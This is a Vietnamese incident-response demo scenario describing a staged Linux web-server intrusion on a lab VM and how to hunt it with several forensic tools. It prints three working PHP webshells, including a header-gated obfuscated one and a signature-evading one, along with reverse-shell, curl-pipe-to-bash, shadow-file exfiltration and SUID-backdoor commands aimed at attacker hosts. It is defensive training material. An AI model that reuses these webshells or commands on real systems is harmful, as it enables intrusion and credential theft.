# Scenario B — Linux Web Server Intrusion (Kịch bản chi tiết cho demo AnalysisHub)

> Kịch bản điều tra **đầy đủ, khớp 100% với hiện trường đã dàn trên VM thật**
> `velociraptor` — `192.168.200.156` (Ubuntu 24.04.4 LTS, kernel 6.8.0-136).
> Mọi path/hash/giờ dưới đây là **ground truth thật** (đã `sha256sum` trên máy) — khi hunt sẽ ra đúng.
>
> Cặp với: [DEMO-HUNTING-STORYLINE.md](DEMO-HUNTING-STORYLINE.md) · [DEMO-HUNTING-TIMELINE-WORKFLOW.md](DEMO-HUNTING-TIMELINE-WORKFLOW.md).
> Ngày demo: **2026-07-22**. Múi giờ máy: **+07:00**.

---

## 0. Thẻ điều tra (Case card)

| Trường | Giá trị |
|---|---|
| **Case** | `IR-2026-B — ACME Document Portal Compromise` |
| **Host** | `velociraptor` · `192.168.200.156` · Ubuntu 24.04.4 · kernel 6.8.0-136 |
| **Vai trò** | Web server công khai — ứng dụng **"ACME Document Portal"** (PHP, có form upload hồ sơ) |
| **Incident window** | **2026-07-21 21:20 → 2026-07-22 03:05** (+07:00) |
| **C2 / attacker** | IP `185.220.101.55` · domain `evil-update.com` · cổng reverse shell `4444` |
| **Dwell time** | ~5h30 (xâm nhập 21:38 → phát hiện 22/07 ~09:05; hoạt động exfil 03:00) |
| **Phân loại** | Web exploitation → RCE → privesc → persistence → exfil (High/Critical) |
| **Dữ liệu ảnh hưởng** | `/etc/passwd`, `/etc/shadow` (đóng gói exfil); DB credential lộ trong `config.php` |

---

## 1. Tóm tắt điều hành (Executive summary)

Đêm 21/07, một attacker khai thác **form upload không kiểm tra phần mở rộng** của ACME Document Portal
để tải lên **webshell PHP** (`uploads/up.php`), đạt RCE dưới quyền `www-data`. Từ webshell, attacker
**tải cryptominer**, mở **reverse shell** về C2, **leo thang lên root**, rồi cài **5 cơ chế persistence
độc lập** (cron, systemd, SSH authorized_keys, profile.d, SUID bash) và **tạo tài khoản backdoor `support`
trong nhóm sudo**. Rạng sáng 22/07, attacker **đóng gói `/etc/passwd`+`/etc/shadow` và exfil** ra C2 —
gây spike outbound mà NOC phát hiện lúc 02:47. Sự cố được xác nhận lúc 09:05 khi DevOps thấy file
`up.php` lạ trong web root.

---

## 2. Kiến trúc & bối cảnh

```
Internet ──▶ [ Apache 2.4.58 + PHP 8.3.6 — ĐANG CHẠY THẬT ]  http://192.168.200.156/
             /var/www/html/          ← ACME Document Portal (PHP, phục vụ HTTP 200)
               ├─ index.php          (trang chính; require includes/functions.php + config.php)
               ├─ config.php         (DB creds: acme_web / S3cr3t_DB_Pass_2024!)  ← secret lộ
               ├─ upload.php         (⚠ move_uploaded_file KHÔNG validate đuôi/mime → T1190)
               ├─ includes/
               │    ├─ functions.php (⚠ TIER-2: backdoor obfuscated, HEADER-GATED — xem dưới)
               │    └─ db.php        (⚠ TIER-3: backdoor EVASIVE, né signature — xem dưới)
               ├─ assets/style.css
               └─ uploads/           (writable www-data)
                    └─ doc_viewer.php (⚠ TIER-1: webshell nguỵ trang "Document Viewer")
             Người quản trị: DevOps (anh Minh). Log Apache thật ở /var/log/apache2/access.log → ELK.
```
Người dùng hợp lệ: `root`, `khoi` (uid 1000, sudo). Web chạy dưới `www-data` (uid 33).

> ### 3 TẦNG WEBSHELL theo độ tinh vi tăng dần (tất cả đã kiểm chứng chạy thật qua HTTP)
> Attacker cài **3 webshell** ở các mức obfuscation khác nhau — cố tình để bài demo cho thấy **từng lớp
> phòng thủ bắt được tới đâu**:
>
> **TIER-1 — `uploads/doc_viewer.php`** (lộ liễu, nguỵ trang tên file):
> ```php
> <?php /* Document Viewer 1.0 - ACME */ if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?>
> ```
> Kích hoạt: `?cmd=id`. → yarascan bắt DỄ (rule `php_dynamic_exec_super`, score 90). Có trong access.log.
>
> **TIER-2 — `includes/functions.php`** (obfuscated + **auth-gated bằng HTTP header**, giấu trong file legit):
> ```php
> $__k = $_SERVER['HTTP_X_TELEMETRY'] ?? ($_COOKIE['_tid'] ?? '');
> if ($__k !== '' && substr(md5($__k),0,8) === 'cae10591') { @eval(gzinflate(base64_decode('...'))); }
> ```
> Payload thật bị nén+base64 (giải mã ra `system($_REQUEST['q'])`). **Chỉ chạy khi gửi đúng header
> `X-Telemetry: s3ss10n`** → visitor thường & log-URL-hunt KHÔNG kích được. Kiểm chứng:
> `curl -H "X-Telemetry: s3ss10n" ".../index.php?q=id"` → `uid=33`; thiếu header → không chạy.
> → yarascan vẫn bắt (rule `php_eval_base64`, score 80) NHƯNG **hunt theo access.log mù** (trigger nằm ở header, không phải URL).
>
> **TIER-3 — `includes/db.php`** (EVASIVE — né cả 2 engine của yarascan):
> ```php
> $q = "sy"; $q .= "st"; $q .= "em";        // ghép tên hàm lúc chạy → không có literal "system("
> if (isset($_GET['ref'])) { @$q(base64_decode($_GET['ref'])); }
> ```
> Kích hoạt: `?ref=<base64(cmd)>`. Không có `eval(`, không `system(` literal, không hex → **yarascan MISS
> cả YARA lẫn pattern-engine**. Chỉ **AI Analysis / review thủ công / phân tích hành vi** phát hiện.
> → đây là "gotcha" thật: cho thấy **vì sao cần AI Analysis của AnalysisHub**, signature là chưa đủ.

---

## 3. GROUND TRUTH — Chuỗi tấn công đầy đủ (attacker's-eye view)

> Đây là **sự thật** cuộc tấn công mà quá trình hunt sẽ tái dựng lại. Mỗi bước ghi rõ **giờ, hành động,
> lệnh, dấu vết để lại, MITRE**. Giờ khớp `mtime` thật của artifact trên máy.

| # | Giờ (+07) | Hành động của attacker | Lệnh / chi tiết | Dấu vết để lại (path) | MITRE |
|---|---|---|---|---|---|
| 1 | 21:20 | Dò quét SSH (brute nhẹ) | 3× login fail từ C2 | `/var/log/auth.log` | T1110 Brute Force |
| 2 | 21:36 | Trinh sát web, thấy `/uploads/` | `GET /uploads/` | `/var/log/apache2/access.log` | T1595 Active Scanning |
| 3 | 21:37 | Khai thác upload → đẩy webshell nguỵ trang | `POST /upload.php` (file `doc_viewer.php`) | `upload.php` (vuln), `uploads/doc_viewer.php` | **T1190** Exploit Public App |
| 4 | 21:38 | RCE qua webshell nguỵ trang (www-data) | `GET /uploads/doc_viewer.php?cmd=id` | `uploads/doc_viewer.php` (mtime 21:38) | **T1505.003** Web Shell |
| 4b | 21:40 | **Giấu backdoor obfuscated vào file legit** (Tier-2, header-gated) | chèn `eval(gzinflate(base64_decode()))` gated `X-Telemetry` vào `includes/functions.php` | `includes/functions.php` (mtime đổi 21:40) | **T1505.003 / T1554 / T1027** Obfuscation |
| 4c | 21:42 | **Backdoor dự phòng EVASIVE** (Tier-3, né signature) | chèn variable-function concat vào `includes/db.php` | `includes/db.php` (mtime đổi 21:42) | **T1505.003 / T1027** |
| 5 | 21:38–21:39 | Trinh sát tại chỗ | `?cmd=id`, header-gated `?q=whoami` | access.log | T1059.004, T1033 |
| 6 | ~21:50–22:00 | **Leo thang lên root** (nghi local exploit / sudo misconfig) | *(cần xác minh — xem §7)* | — | **T1548 / T1068** PrivEsc |
| 7 | 22:02 | Tải cryptominer về (ẩn tên `kworker`) | `wget C2/kworker -O /var/tmp/.cache/kworker` | `/var/tmp/.cache/kworker` (SUID, chuỗi xmrig) | T1105, **T1496** |
| 8 | 22:05 | Thả script reverse shell | beacon → `bash -i >& /dev/tcp/185.220.101.55/4444` | `/dev/shm/.x` (world-writable, volatile) | **T1059.004** |
| 9 | 22:08 | Persistence #1 — cron | `*/10 * * * * root curl evil-update.com \| bash` | `/etc/cron.d/apache-update` | **T1053.003** Cron |
| 10 | 22:10 | Persistence #2 — systemd | unit `sysupdate.service` ExecStart `/dev/shm/.x` (enabled) | `/etc/systemd/system/sysupdate.service` | **T1543.002** systemd |
| 11 | 22:12 | Persistence #3 — SSH backdoor | append key `attacker@evil` | `/root/.ssh/authorized_keys` | **T1098.004** SSH keys |
| 12 | 22:18 | Persistence #4 — shell init | curl beacon trong profile.d | `/etc/profile.d/00-update.sh` | **T1546.004** Unix Shell Init |
| 13 | 22:20 | Persistence #5 — SUID re-entry | `cp /bin/bash …; chmod 4755` | `/tmp/.bd`, `/var/tmp/.cache/.bd` | **T1548.001** SUID |
| 14 | 22:25 | Tài khoản backdoor + sudo | `useradd support; usermod -aG sudo` | `/etc/passwd`, `/home/support/.bash_history` | **T1136.001** Create Account |
| 15 | 22:30 | Truy cập credential | `cat /etc/shadow` | history của `support` | T1003.008 /etc/passwd&shadow |
| 16 | 03:00 (22/7) | Đóng gói & exfil dữ liệu | `tar czf /tmp/.loot.tgz /etc/passwd /etc/shadow; curl -T … C2` | `/tmp/.loot.tgz` | **T1074**, **T1041** Exfil over C2 |

**Kill-chain (ATT&CK):** Recon → Initial Access(T1190) → Execution(T1505.003/T1059.004) →
Privilege Escalation(T1548) → Persistence(×5) → Credential Access(T1003) → Collection(T1074) →
Command & Control(T1071) → Exfiltration(T1041).

---

## 4. Bản đồ bằng chứng (Artifact inventory — hash thật)

> Đây là danh mục để đối chiếu trong quá trình hunt. **SHA-256 lấy trực tiếp từ VM.**

| # | Path | mtime | SHA-256 | Loại |
|---|---|---|---|---|
| 1 | `/var/www/html/upload.php` | 21-07 21:30 | `769b4aaa…31ee87` | vuln vector |
| 2 | `/var/www/html/config.php` | 21-07 21:30 | `4a950643…14dc1b7` | secret (DB creds) |
| 3 | `/var/www/html/uploads/doc_viewer.php` | 21-07 21:38 | `32aba617…4ee9f9b2` | **Tier-1 webshell nguỵ trang** |
| 3b | `/var/www/html/includes/functions.php` | 21-07 **21:40** | `caebf67a…0438790f` | **Tier-2 obfuscated + header-gated** |
| 3c | `/var/www/html/includes/db.php` | 21-07 **21:42** | `b36b7cb6…6c59b263` | **Tier-3 EVASIVE (né signature)** |
| 4 | `/var/www/html/uploads/shell.bin` | 21-07 21:38 | `275a021b…51fd0f` | EICAR (AV test) |
| 5 | `/var/tmp/.cache/kworker` | 21-07 22:02 | `fe506fcc…553a01c` | **miner (SUID)** |
| 6 | `/dev/shm/.x` | 21-07 22:05 | `007f05a6…5892132` | **reverse shell** |
| 7 | `/etc/cron.d/apache-update` | 21-07 22:08 | `d5339207…8abf5dc74`→`d5339207…` | cron persist |
| 8 | `/etc/systemd/system/sysupdate.service` | 21-07 22:10 | `ae39c3c3…cb3abc2e` | systemd persist |
| 9 | `/root/.ssh/authorized_keys` | 21-07 22:12 | `2ad00739…2bd80c5a` | SSH backdoor |
| 10 | `/etc/profile.d/00-update.sh` | 21-07 22:18 | `4e2ab8d1…985927a` | profile.d persist |
| 11 | `/tmp/.bd` · `/var/tmp/.cache/.bd` | 21-07 22:20 | `bc5945fe…1aaaef1` | **SUID root shell** |
| 12 | `/home/support/.bash_history` | 21-07 22:25 | `52fd0130…7f7c2f7f` | attacker commands |
| 13 | `/tmp/.loot.tgz` | 22-07 03:00 | `099fbbcf…0f96a9f` | **staged loot** |
| — | user `support` (uid 1001, nhóm **sudo**) | — | — | backdoor account |

> ⚠ Lưu ý volatile: `/dev/shm/.x`, `/tmp/.bd`, `/tmp/.loot.tgz` nằm trên tmpfs → **mất khi reboot**.
> Bản bền vững tương ứng: miner & SUID ở `/var/tmp/.cache/` (var/tmp sống sót reboot). **Re-stage
> các file volatile ngay trước buổi demo** (script ở §11).

---

## 5. INTAKE — Sự cố được phát hiện (Timeline Node #1)

**02:47 (22/07) — NOC alert (Zabbix):** `velociraptor` outbound bandwidth spike + CPU load cao rạng sáng.
**09:05 (22/07) — DevOps (anh Minh), ticket #OPS-2290:** phát hiện `uploads/up.php` team không deploy;
Google Search Console cảnh báo site chứa nội dung spam; NOC xác nhận outbound bất thường đêm qua.
**09:10 — SOC mở case `IR-2026-B`, gán agent VM.**

**→ Điền Timeline (Add event đầu tiên):**
`event_time=2026-07-22 02:47` · `source=manual` · `host=velociraptor` · `severity=medium` ·
`title="NOC alert: outbound spike + CPU cao"` · `detail="Sau đó DevOps báo up.php lạ + Search Console spam (#OPS-2290)"`.

---

## 6. Giả thuyết · Target · Câu hỏi điều tra

**Giả thuyết:** khai thác form upload → webshell → miner + reverse shell → privesc root → 5 persistence
+ backdoor user → exfil `/etc/shadow` ra C2.

**Target & scope:**
| Hạng mục | Target |
|---|---|
| Host | `velociraptor` (192.168.200.156) |
| Time window | 21-07 21:20 → 22-07 03:05 |
| Đường vào | `/var/www/html/upload.php` (vuln), `uploads/up.php` (shell) |
| Persistence cần soát | cron, systemd, ssh keys, profile.d, SUID, tài khoản mới |
| C2 | 185.220.101.55, evil-update.com, cổng 4444 |
| Dữ liệu | `/tmp/.loot.tgz` (passwd+shadow), `config.php` (DB creds) |

**Câu hỏi phải trả lời (IR objectives):**
1. Webshell vào **lúc nào, qua request/đường nào**? (Q-ENTRY)
2. Attacker chạy những gì dưới www-data? (Q-EXEC)
3. **Đã leo lên root chưa & bằng cách nào?** (Q-PRIVESC)
4. Có **bao nhiêu cơ chế persistence** & ở đâu? (Q-PERSIST)
5. **Tài khoản/khoá backdoor** nào được thêm? (Q-ACCESS)
6. **Dữ liệu gì bị lấy, exfil ra đâu**? (Q-EXFIL)

---

## 7. HUNTING PLAYBOOK — từng bước trên AnalysisHub

> Vòng 1 dựng khung xương → Vòng 2 hunt & điền timeline → Vòng 3 chuẩn hoá (theo
> [TIMELINE-WORKFLOW](DEMO-HUNTING-TIMELINE-WORKFLOW.md)). Mỗi bước ghi **tool + args + kỳ vọng + điền
> timeline + trả lời câu hỏi nào**.

### VÒNG 1 — Khung xương thời gian
**B1. ELK — access.log & auth.log → Import ELK.**
- Đẩy `/var/log/apache2/access.log` + `/var/log/auth.log` vào ELK (ELK → Log Ingest).
- Hunt: `url.original: "up.php"` và `"Failed password"`.
- **Kỳ vọng:** hit `POST /upload.php` (21:37), `GET /uploads/up.php?cmd=id` (21:38), 3× failed password (21:20).
- **Điền timeline:** tab Attack Timeline → **Import ELK** → chọn case → mốc 21:20/21:37/21:38 có `@timestamp` thật.
- **Trả lời:** Q-ENTRY, Q-EXEC (một phần). `tactic=initial-access T1190`, `severity=high`.

### VÒNG 2 — Hunt từng mắt xích & điền timeline

**B2. yarascan — webshell (web root).** ⭐ *bước quan trọng nhất — bắt 2/3 tầng, tầng 3 chuyển AI*
- Job/Scanner: `scan /var/www --scenario linux -o {{OUTDIR}}`
- **Kỳ vọng — 2 hit** (yarascan bắt Tier-1 & Tier-2):
  - `uploads/doc_viewer.php` (Tier-1) — rule `php_dynamic_exec_super` (score 90, **critical**).
  - `includes/functions.php` (Tier-2) — rule `php_eval_base64` (score 80, **high**); mtime lệch **21:40** so với app 21:30 → file legit bị sửa.
  - ⚠ **`includes/db.php` (Tier-3) KHÔNG ra hit** — né cả YARA lẫn pattern-engine. → chuyển sang B2b.
- **Điền:** mỗi hit → **Save to Case + promote IOC** (functions.php `caebf67a…`; doc_viewer.php `32aba617…`, ioc_type File-Hash). `persistence / T1505.003`.
- **Xác minh sống:** `curl -H "X-Telemetry: s3ss10n" ".../index.php?q=id"` → `uid=33`.
- **Trả lời:** Q-ENTRY (một phần).

**B2b. AI Analysis — bắt webshell EVASIVE (Tier-3) mà signature bỏ sót.** ⭐ *điểm nhấn giá trị AI*
- Từ **Files/Evidence** tải `includes/db.php` → nút **🧠 AI** (AI Analysis, nguồn `upload`/`evidence`).
- **Kỳ vọng:** AI nhận ra tên hàm ghép runtime (`"sy"."st"."em"`) + `base64_decode($_GET['ref'])` gọi qua biến → webshell obfuscated, dù không khớp signature nào.
- **Bổ sung:** đối chiếu mtime — `db.php` sửa **21:42**, lệch cụm app 21:30 → file legit bị chèn code.
- **Điền:** AI triage → timeline (`persistence/T1505.003 high`), promote IOC `b36b7cb6…`.
- **Trả lời:** Q-ENTRY (đầy đủ). **Bài học:** signature bắt cái đã biết; **AI + phân tích bất thường** mới phủ được webshell né tránh.

**B3. yarascan — full hunt (reverse shell + miner + persistence content).**
- Job: `scan /tmp /dev/shm /var/tmp /etc/cron.d /etc/systemd/system --scenario linux --all-files -o {{OUTDIR}}`
  *(bắt buộc `--all-files` vì các file này không có đuôi web-script).*
- **Kỳ vọng:** `/dev/shm/.x` → `LIN_Reverse_Shell`; `/etc/cron.d/apache-update` → `LIN_Persistence`; `/var/tmp/.cache/kworker` → `LIN_CryptoMiner` (chuỗi xmrig/stratum/randomx).
- **Điền:** mỗi hit → Save to Case / AI triage. Reverse shell `execution/T1059.004 high`; cron `persistence/T1053.003 high`; miner `impact/T1496 high`.
- **Trả lời:** Q-EXEC, Q-PERSIST (một phần).

**B4. Edge Forensics → Autoruns (native).**
- Run Scan. Autoruns Linux quét systemd/cron/rc/**profile.d**/xdg và tự gắn cờ.
- **Kỳ vọng:** `sysupdate.service` (ExecStart `/dev/shm/.x` → cờ `exec-from-world-writable`); cron `apache-update` (cờ `suspicious-command`); `/etc/profile.d/00-update.sh` (shell-init, curl beacon).
- **Điền:** tick → **Save to Case + promote IOC**. `persistence/T1543.002`, `persistence/T1546.004`.
- **Trả lời:** Q-PERSIST. *(Ghi chú: Autoruns native KHÔNG quét ssh authorized_keys — xem B6.)*

**B5. Edge Forensics → Processes & Network.**
- **Kỳ vọng:** nếu reverse shell/miner đang chạy → tiến trình từ `/dev/shm`,`/var/tmp`; kết nối tới `185.220.101.55:4444`. (Sau reboot có thể không còn chạy → dựa vào artifact tĩnh.)
- **Điền:** kết nối C2 → Save to Case + promote IOC (IP `185.220.101.55`). `command-and-control/T1071 high`.
- **Trả lời:** Q-EXFIL (C2).

**B6. LinPEAS — privesc, SUID, ssh keys, backdoor user (điểm mù của yarascan).**
- Job: `linpeas.sh -a` (kết quả ở Process Output → AI đọc qua nguồn `job`).
- **Kỳ vọng (LinPEAS nêu bật):**
  - SUID lạ: `/tmp/.bd`, `/var/tmp/.cache/.bd`, `/var/tmp/.cache/kworker` (T1548.001)
  - SSH: key lạ trong `/root/.ssh/authorized_keys` (T1098.004)
  - User: `support` uid 1001 trong nhóm **sudo** (T1136.001)
- **Điền:** **Add event** (manual) cho SUID (event_time = mtime 22:20), ssh key (22:12), user support (22:25) — gắn tactic/technique tương ứng. Hoặc **AI triage** trên job output.
- **Trả lời:** Q-PRIVESC, Q-PERSIST, Q-ACCESS.

**B7. Terminal + Files (xác minh trực quan + lấy bằng chứng).**
- **Files:** duyệt `/var/www/html/uploads` (tải `up.php`), `/var/tmp/.cache`, `/home/support`.
- **Terminal:**
  ```
  find / -perm -4000 -type f 2>/dev/null            # SUID -> /tmp/.bd, /var/tmp/.cache/.bd,kworker
  cat /root/.ssh/authorized_keys                     # key attacker@evil
  grep -E ':x:1001:' /etc/passwd; getent group sudo  # user support + sudo
  cat /home/support/.bash_history                    # wget kworker, cat /etc/shadow, tar loot, curl -T C2
  grep -Ri 'S3cr3t_DB_Pass' /var/www/html/config.php # secret lộ
  ```
- **Điền:** đọc `.bash_history` → mỗi lệnh là 1 mốc (Add event): tải miner (22:02), đọc shadow (22:30), exfil (03:00). `collection/T1074`, `exfiltration/T1041`.
- **Trả lời:** Q-EXFIL, Q-EXEC (đầy đủ).

**B8. Collection Checklist + Compliance (bổ sung chuẩn IR/audit).**
- Checklist Phase-1 Linux: system info, staging dirs (`/tmp /var/tmp /dev/shm`), user artifacts.
- Compliance IAM (tuỳ chọn): UID 0 & sudoers → phát hiện `support` trong sudo; listening ports; SUID list.

### VÒNG 3 — Chuẩn hoá & báo cáo
**B9.** Case → **Analyze Evidence** (AI quét mọi job/scan → vá finding còn thiếu) →
tab Timeline → **AI Rebuild (Append)** (chuẩn hoá tiêu đề, gắn tactic trống) →
xem **ATT&CK matrix** đủ cột Initial Access→…→Exfiltration → **AI Summary** →
**Incident Report** (HTML/PDF) → **Export STIX**.

---

## 8. Attack Timeline hoàn chỉnh (kết quả mong đợi sau hunt)

| event_time | host | tactic / technique | severity | title | source |
|---|---|---|---|---|---|
| 07-22 02:47 | velociraptor | — | medium | NOC alert: outbound spike | manual |
| 07-21 21:20 | velociraptor | credential-access / T1110 | medium | 3× SSH failed password từ 185.220.101.55 | elk |
| 07-21 21:37 | velociraptor | initial-access / T1190 | high | POST /upload.php — upload không kiểm tra | elk |
| 07-21 21:38 | velociraptor | persistence / T1505.003 | critical | Webshell uploads/up.php (RCE www-data) | elk / ai |
| 07-21 21:38 | velociraptor | execution / T1059.004 | high | Webshell chạy id/whoami | elk |
| 07-21 ~22:00 | velociraptor | privilege-escalation / T1548 | critical | Leo thang lên root (nghi local exploit) | manual |
| 07-21 22:02 | velociraptor | impact / T1496 | high | Tải cryptominer /var/tmp/.cache/kworker | ai |
| 07-21 22:05 | velociraptor | execution / T1059.004 | high | Reverse shell /dev/shm/.x → C2:4444 | ai |
| 07-21 22:08 | velociraptor | persistence / T1053.003 | high | Cron /etc/cron.d/apache-update | edge-forensics |
| 07-21 22:10 | velociraptor | persistence / T1543.002 | high | systemd sysupdate.service (enabled) | edge-forensics |
| 07-21 22:12 | velociraptor | persistence / T1098.004 | high | SSH backdoor key trong /root | manual |
| 07-21 22:18 | velociraptor | persistence / T1546.004 | medium | profile.d 00-update.sh beacon | edge-forensics |
| 07-21 22:20 | velociraptor | persistence / T1548.001 | high | SUID bash /tmp/.bd, /var/tmp/.cache/.bd | manual |
| 07-21 22:25 | velociraptor | persistence / T1136.001 | high | Backdoor user 'support' + sudo | manual |
| 07-21 22:30 | velociraptor | credential-access / T1003.008 | high | cat /etc/shadow (từ history) | manual |
| 07-22 03:00 | velociraptor | exfiltration / T1041 | critical | tar loot + curl -T ra C2 | manual |

---

## 9. IOC (sẵn sàng Export STIX)

**Host / file (SHA-256) — 3 webshell:**
- `32aba6176e2cf5cf2287c55bb951f909247a377925c22f5eb72b18cc4ee9f9b2` — doc_viewer.php (Tier-1 nguỵ trang)
- `caebf67a3d54194a29e342232dee142054ede908a9a5019873c736830438790f` — functions.php (Tier-2 obfuscated, header-gated `X-Telemetry: s3ss10n`)
- `b36b7cb635aa361cb52beff285b940107d406a861c41e2afe3cc072c6c59b263` — db.php (Tier-3 evasive, trigger `?ref=base64(cmd)`)
- `fe506fcc06febc23fdb0957162cbf0f13d88b75c0c15a6d8625d82f7e553a01c` — kworker (miner)
- `007f05a64b2d81ee3a33a93dba2f1c1e7cdd7bfac2bf120194b37fd6a5892132` — /dev/shm/.x (reverse shell)
- `bc5945feb8bd26203ebfafea5ce1878bb2e32cb8fb50ab7ae395cfb1e1aaaef1` — .bd (SUID bash backdoor)
- `099fbbcf645da0de30dcdb988c2f1cf4bd8cd5b2c834c8392352eaa680f96a9f` — .loot.tgz (staged exfil)

**Paths:** `/var/www/html/uploads/up.php` · `/dev/shm/.x` · `/etc/cron.d/apache-update` ·
`/etc/systemd/system/sysupdate.service` · `/root/.ssh/authorized_keys` · `/etc/profile.d/00-update.sh` ·
`/tmp/.bd` · `/var/tmp/.cache/{.bd,kworker}` · `/tmp/.loot.tgz`
**Network:** IP `185.220.101.55` · domain `evil-update.com` · cổng `4444`
**Account:** user `support` (uid 1001, nhóm sudo)
**Exposed secret:** DB `acme_web` / `S3cr3t_DB_Pass_2024!` (config.php — cần đổi ngay)

---

## 10. Kết luận, mức độ & khắc phục

**Kết luận:** máy bị **root-level compromise**. Dwell time ~5h30. Có **6 cơ chế truy cập bền vững**
(cron, systemd, ssh key, profile.d, SUID×2, tài khoản sudo) → phải diệt **tất cả** trước khi khôi phục.
Credential (`/etc/shadow`, DB pass) coi như **đã lộ**.

**Containment/Eradication ngay:**
1. Cô lập mạng host; chặn `185.220.101.55` / `evil-update.com` ở firewall.
2. Xoá webshell `uploads/up.php`; vá `upload.php` (validate đuôi + lưu ngoài web root).
3. Diệt 6 persistence (xem §11); `userdel -r support`.
4. **Đổi toàn bộ credential**: mọi user (`passwd`), DB `acme_web`, revoke ssh key lạ.
5. Rebuild từ image sạch nếu có thể (root compromise → không tin tưởng host).

---

## 11. Phụ lục — Re-stage volatile & Reset lab

**Re-stage nhanh 3 file volatile trước demo** (chạy `sudo` trên VM):
```bash
printf '%s\n' '#!/bin/bash' '# bash -i >& /dev/tcp/185.220.101.55/4444 0>&1 (SIMULATED)' 'echo sim-beacon' | sudo tee /dev/shm/.x >/dev/null
sudo chmod +x /dev/shm/.x
sudo cp /bin/bash /tmp/.bd && sudo chmod 4755 /tmp/.bd
sudo tar czf /tmp/.loot.tgz /etc/passwd /etc/hostname 2>/dev/null
sudo touch -d '2026-07-21 22:05:00' /dev/shm/.x
sudo touch -d '2026-07-21 22:20:00' /tmp/.bd
sudo touch -d '2026-07-22 03:00:00' /tmp/.loot.tgz
```
**Reset lab về sạch:**
```bash
sudo systemctl disable --now sysupdate.service; sudo rm -f /etc/systemd/system/sysupdate.service
sudo rm -f /etc/cron.d/apache-update /etc/profile.d/00-update.sh /dev/shm/.x /tmp/.bd /tmp/.loot.tgz
sudo rm -rf /var/tmp/.cache
sudo rm -rf /var/www/html   # gồm webshell (functions.php/doc_viewer.php) + app lab
sudo sed -i '/attacker@evil/d' /root/.ssh/authorized_keys
sudo userdel -r support 2>/dev/null
# Gỡ hẳn web server (nếu muốn trả máy về trạng thái trước demo):
sudo systemctl disable --now apache2; sudo apt-get purge -y apache2 php libapache2-mod-php
```

> **Trạng thái hiện tại của lab (đã dàn sẵn, 2026-07-22):** Apache+PHP **đang chạy**, web truy cập tại
> `http://192.168.200.156/`, webshell ẩn trong `functions.php` **đã kiểm chứng hoạt động**. Chỉ cần
> re-stage 3 file volatile (§11) nếu VM vừa reboot, rồi bắt đầu hunt.

---

## 12. Ma trận phát hiện (artifact → tool nào bắt được)

| Artifact | yarascan | Edge Forensics | LinPEAS | ELK | Terminal |
|---|:--:|:--:|:--:|:--:|:--:|
| doc_viewer.php (Tier-1 nguỵ trang) | ✅ | — | — | ✅(log) | ✅ |
| functions.php (Tier-2 obfuscated/gated) | ✅ | — | — | ❌ header-gated | ⚠ khó soi mắt |
| **db.php (Tier-3 evasive)** | ❌ né signature | — | — | — | ⚠ AI/behavioral |
| /dev/shm/.x (reverse shell) | ✅`--all-files` | Processes* | — | — | ✅ |
| kworker (miner) | ✅`--all-files` | Processes* | ✅ | — | ✅ |
| cron apache-update | ✅`--all-files` | ✅ Autoruns | ✅ | — | ✅ |
| systemd sysupdate | — | ✅ Autoruns | ✅ | — | ✅ |
| profile.d 00-update | — | ✅ Autoruns | ✅ | — | ✅ |
| **ssh authorized_keys** | ❌ | ❌ | ✅ | — | ✅ |
| **SUID /tmp/.bd,/var/tmp** | ❌ | ❌ | ✅ | — | ✅ |
| **user support (sudo)** | ❌ | ❌ | ✅ | — | ✅ |
| loot.tgz / exfil | ❌ | — | ✅(susp) | ✅(outbound) | ✅ |

> Bài học demo: **không tool nào phủ hết** — yarascan mạnh về file-content (webshell/miner/reverse shell),
> Edge Forensics mạnh về persistence có cấu trúc (systemd/cron/profile), **LinPEAS lấp điểm mù**
> (SUID, ssh key, tài khoản), ELK cho mốc thời gian & outbound. **Kết hợp cả 4 + AI** mới dựng đủ timeline.
